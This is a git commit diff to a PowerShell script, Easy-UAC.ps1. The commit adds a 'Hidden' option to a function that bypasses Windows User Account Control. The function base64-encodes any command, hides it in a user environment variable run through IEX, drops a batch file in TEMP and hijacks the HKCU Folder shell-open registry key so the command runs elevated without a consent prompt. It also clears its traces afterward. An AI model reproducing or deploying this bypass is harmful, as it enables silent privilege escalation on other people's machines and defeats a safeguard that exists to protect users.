b225df9ab6db0919fe91e8c922c5f0640e380921
moritzpfefferkorn@hotmail.com <moritzpfefferkorn@hotmail.com>
2021-02-23 16:25:07 +0100

    Update Easy-UAC.ps1

--- Easy-UAC.ps1
+++ Easy-UAC.ps1
@@ -4,12 +4,16 @@ function Easy-UAC {
 		[Parameter(Mandatory = $true, Position = 0)]
 		[ValidateNotNullOrEmpty()]
 		[string]
-		$Command
+		$Command,
+		[Parameter(Mandatory = $false, Position = 1)]
+		[bool]
+		$Hidden
 	)
 	powershell -WindowStyle Hidden -c ""
+	if ($Hidden) {$hide = "-WindowStyle Hidden"} else {$hide = ""}
 	$encCommand = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($Command))
 	$Path = $env:TEMP + '\A.bat'
-	$Value = "powershell -WindowStyle Hidden -c Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User);IEX([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')))"
+	$Value = "powershell $hide -c Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', '',[System.EnvironmentVariableTarget]::User);IEX([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')))"
 	[System.Environment]::SetEnvironmentVariable('A', $Value, [System.EnvironmentVariableTarget]::User)
 	New-Item -Path $Path -Value '%A%'
 	New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $Path
